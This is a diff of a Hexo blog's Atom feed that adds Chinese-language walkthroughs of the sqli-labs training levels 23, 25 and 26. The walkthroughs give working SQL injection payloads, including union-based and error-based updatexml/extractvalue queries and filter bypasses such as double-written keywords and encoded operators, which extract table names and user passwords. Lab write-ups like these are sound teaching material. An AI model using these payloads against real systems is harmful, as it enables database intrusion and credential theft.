@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-02-24T04:32:29.703Z</updated>
+  <updated>2022-02-24T07:47:47.418Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,66 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>26</title>
+    <link href="http://example.com/2022/02/24/26/"/>
+    <id>http://example.com/2022/02/24/26/</id>
+    <published>2022-02-24T07:09:46.000Z</published>
+    <updated>2022-02-24T07:47:47.418Z</updated>
+    
+    <content type="html"><![CDATA[<p>由题目可以知道此题除了过滤‘or’和‘and’还过滤了行注释–与#(含URL编码)以及多行注释/**/（被解释为空格，常用于过滤空格时），还过滤了(空格)，以及正反斜杠/与\。所以此处想要破解就需要尽量避免对与空格的使用，或找到可以代替空格的字符来表达，我这里使用updatexml（）来避免空格的使用。<br><img src="https://s2.loli.net/2022/02/24/olzdMjRS7VZrHtT.png" alt="1.png"></p><pre><code>&#39;%26%26updatexml(1,concat(&#39;~&#39;,database(),&#39;~&#39;),1)%26%26&#39;1&#39;=&#39;1       //这里%26%26代替&amp;&amp;</code></pre><p><img src="https://s2.loli.net/2022/02/24/dTBC4vkzOiyMsnQ.png" alt="2.png"></p><pre><code>?id=&#39;%26%26updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security)),0x7e),1)||&#39;1&#39;=&#39;1</code></pre><p><img src="https://s2.loli.net/2022/02/24/LhHK7I3kgEx6jJM.png" alt="3.png"></p><pre><code>?id=%27%26%26updatexml(1,concat(0x7e,substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=%27users%27)),33,64),0x7e),1)||%271%27=%271</code></pre><p><img src="https://s2.loli.net/2022/02/24/46ZqCua75MrRJX8.png" alt="4.png"></p><pre><code>?id=%27%26%26updatexml(1,concat(0x7e,substr((select(group_concat(id,username,&#39;~&#39;,passwoorrd))from(security.users)),1,31),0x7e),1)||%271%27=%271</code></pre><p><img src="https://s2.loli.net/2022/02/24/LCqVHPhd9cmz7vR.png" alt="5.png"></p><p>但在26a中没有错误回显只能使用普通注入<br>    ?id=’)%0bunion%0bselect%0b1,database(),3%0b||1=(‘1<br>之后和原先的一样</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;由题目可以知道此题除了过滤‘or’和‘and’还过滤了行注释–与#(含URL编码)以及多行注释/**/（被解释为空格，常用于过滤空格时），还过滤了(空格)，以及正反斜杠/与\。所以此处想要破解就需要尽量避免对与空格的使用，或找到可以代替空格的字符来表达，我这里使用updat</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>less25</title>
+    <link href="http://example.com/2022/02/24/less25/"/>
+    <id>http://example.com/2022/02/24/less25/</id>
+    <published>2022-02-24T06:37:50.000Z</published>
+    <updated>2022-02-24T06:47:30.963Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2022/02/24/vhJeSCWwg69fcmy.png" alt="1.png"><br>由此题的体面可以推出这题含有，‘or’和‘and’的过滤，需要绕过过滤来进行破解<br>有过滤的时候首先要判断这个过滤是一次性的还是非一次性的：<br>若是一次性的，且只是将过滤字符换成了空字符：<br>可以考虑用双写绕过：or=oorr、and=anandd等等</p><p>若是非一次性的，就要考虑一些变形：<br>大小写变形绕过—— or=Or=oR=OR<br>利用运算符——   or=||、and=&amp;&amp;<br>URL编码绕过——  #=%23，Hex编码—— ~=0x7e<br>添加注释  ——  /<em>or</em>/</p><p>此题为一次性的过滤因此可以使用双写的方式来跳过过滤<br>将information改为infoorrmation<br>  password改为passwoorrd<br>其余爆破代码与less 1相同<br><img src="https://s2.loli.net/2022/02/24/cZGT1jDhObk4FHQ.png" alt="2.png"><br><img src="https://s2.loli.net/2022/02/24/8FixS3J5oWgGqRb.png" alt="3.png"><br><img src="https://s2.loli.net/2022/02/24/Ku8NyHghTzpAIUe.png" alt="4.png"></p><p>也可以使用报错破解的方式：<br>?id=-1’ || extractvalue(1,concat(0x7e,database()))– #<br>或者<br>?id=1’ || extractvalue(1,concat(0x7e,database()))– #     </p><p>less 25a：<br>本关与Less-25十分相似，既可以正常union注入也可以用脚本Bool或Time盲注。但却不能报错注入：<br>原因在于没有输出错误项，即关闭了错误报告。<br><img src="https://s2.loli.net/2022/02/24/4lpHgYwPGX6VLk7.png" alt="5.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/02/24/vhJeSCWwg69fcmy.png&quot; alt=&quot;1.png&quot;&gt;&lt;br&gt;由此题的体面可以推出这题含有，‘or’和‘and’的过滤，需要绕过过滤来进行破解&lt;br&gt;有过滤的时候首先要判断这个过滤</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>less 23</title>
+    <link href="http://example.com/2022/02/24/23/"/>
+    <id>http://example.com/2022/02/24/23/</id>
+    <published>2022-02-24T05:36:25.000Z</published>
+    <updated>2022-02-24T05:47:26.986Z</updated>
+    
+    <content type="html"><![CDATA[<p>由题目源码中可以得出这边题目与less 1的区别是这边将#，+，–给过滤不能使用注释符来忽略最后的’。需要使用 or ‘1’=’1或去除’的方法进行破解。<br><img src="https://s2.loli.net/2022/02/24/drUpalCmLwsEDzZ.png" alt="1.png"></p><p>再从union select 1，2，3中可以看出所回显的是1，2两个数据通过这些信息就可以开始破解。<br><img src="https://s2.loli.net/2022/02/24/KugFDGSkl2rQI8e.png" alt="2.png"></p><pre><code>?id=-1&#39; union select 1,(database()),3 or &#39;1&#39;=&#39;1</code></pre><p><img src="https://s2.loli.net/2022/02/24/nLfNyk61GpjeRgS.png" alt="3.png"></p><pre><code>?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),3 or &#39;1&#39;=&#39;1</code></pre><p><img src="https://s2.loli.net/2022/02/24/5fW49S2YiI3Dsae.png" alt="4.png"></p><pre><code>?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3 or &#39;1&#39;=&#39;1</code></pre><p><img src="https://s2.loli.net/2022/02/24/owWSBM5uabGpIx1.png" alt="5.png"><br>    ?id=-1’ union select 1,(select group_concat(id,username,’~’,password) from security.users),3 or ‘1’=’1<br><img src="https://s2.loli.net/2022/02/24/nRfHakymSCIwdjv.png" alt="6.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;由题目源码中可以得出这边题目与less 1的区别是这边将#，+，–给过滤不能使用注释符来忽略最后的’。需要使用 or ‘1’=’1或去除’的方法进行破解。&lt;br&gt;&lt;img src=&quot;https://s2.loli.net/2022/02/24/drUpalCmLwsEDzZ</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>对于 base64 的基础理解</title>
@@ -271,6 +331,19 @@ f</summary>
   </entry>
   
   <entry>
+    <title>My New Post</title>
+    <link href="http://example.com/1970/01/01/My-New-Post/"/>
+    <id>http://example.com/1970/01/01/My-New-Post/</id>
+    <published>1970-01-01T00:00:02.021Z</published>
+    <updated>2021-10-09T01:50:45.158Z</updated>
+    
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
     <title>easy sql</title>
     <link href="http://example.com/1970/01/01/easy%20sql/"/>
     <id>http://example.com/1970/01/01/easy%20sql/</id>
@@ -284,19 +357,6 @@ f</summary>
       
     <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/13/Z7TMRVi92p5raCc.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;由题目可知此题为联合查询输入-1因为数据中没有输入的值以空位代替，显示的为union select 后所输入的值&lt;br&gt;&lt;img</summary>
       
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>My New Post</title>
-    <link href="http://example.com/1970/01/01/My-New-Post/"/>
-    <id>http://example.com/1970/01/01/My-New-Post/</id>
-    <published>1970-01-01T00:00:02.021Z</published>
-    <updated>2021-10-09T01:50:45.158Z</updated>
-    
     
     
     
